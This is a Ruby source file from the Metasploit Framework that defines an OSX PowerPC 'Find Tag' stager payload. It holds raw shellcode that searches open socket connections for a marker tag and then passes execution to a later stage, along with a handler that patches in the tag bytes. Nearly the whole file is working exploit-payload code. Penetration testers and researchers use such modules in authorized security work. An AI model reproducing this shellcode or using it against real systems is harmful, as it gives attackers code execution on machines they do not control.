##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/find_tag'


###
#
# FindTag
# -------
#
# OSX find tag stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Find Tag Stager',
      'Description'   => 'Use an established connection',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_PPC,
      'Handler'       => Msf::Handler::FindTag,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'TAG' => [ 54, 'RAW' ],
            },
          'Payload' =>
            "\x3b\xa0\x0f\xff\x3b\xc0\x0f\xff\x37\x9d\xf0\x02\x7f\xdc\xf0\x51" +
            "\x41\x80\xff\xf0\x38\x1d\xf0\x67\x7f\xc3\xf3\x78\x38\x81\xef\xf8" +
            "\x38\xa0\x0f\xff\x38\xdd\xf0\x81\x44\xff\xff\x02\x7c\xc6\x32\x79" +
            "\xa3\x61\xef\xf8\x2c\x1b\x13\x37\x40\x82\xff\xd4\x38\x81\xef\xfc" +
            "\x7c\x89\x03\xa6\x4c\x81\x04\x20\x7c\xc6\x32\x79"
        }
      ))
  end

  #
  # Replace the TAG handler to just use two bytes
  #
  def replace_var(raw, name, offset, pack)
    if (name == 'TAG')
      raw[offset, 2] = datastore[name][0,2]
      return true
    end

    return false
  end

end
